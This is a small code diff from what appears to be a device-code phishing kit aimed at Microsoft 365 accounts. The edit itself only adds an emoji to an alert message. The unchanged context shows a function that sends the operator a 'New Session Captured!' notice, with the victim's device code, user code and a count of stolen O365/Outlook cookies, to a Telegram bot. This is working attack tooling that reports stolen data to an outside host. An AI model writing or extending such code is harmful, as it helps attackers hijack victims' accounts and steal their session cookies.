@@ -55,7 +55,7 @@ async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
         return
     try:
-        msg = f"New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (O365/Outlook included)"
+        msg = f"✅ New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (O365/Outlook included)"
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
